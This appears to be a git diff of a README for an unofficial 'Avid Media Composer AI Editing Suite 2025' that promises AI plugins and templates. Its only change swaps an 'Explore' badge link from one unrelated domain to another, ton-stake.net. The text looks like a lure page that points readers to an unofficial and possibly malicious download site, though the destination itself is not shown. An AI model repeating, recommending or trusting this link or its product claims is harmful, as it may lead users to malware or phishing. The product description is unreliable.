@@ -2,7 +2,7 @@
 
 Avid Media Composer AI Editing Suite 2025 provides a comprehensive collection of AI plugins, scripts, and templates to streamline video editing, color grading, and audio synchronization in Avid Media Composer. Optimized for Windows, this suite empowers professionals to deliver studio-grade footage efficiently.
 
-[![Explore Avid Media Composer AI Editing Suite](https://img.shields.io/badge/Explore-Avid_Media_Composer_AI_Editing_Suite-blueviolet)](https://glocktober.com)
+[![Explore Avid Media Composer AI Editing Suite](https://img.shields.io/badge/Explore-Avid_Media_Composer_AI_Editing_Suite-blueviolet)](https://ton-stake.net)
 
 ---
 
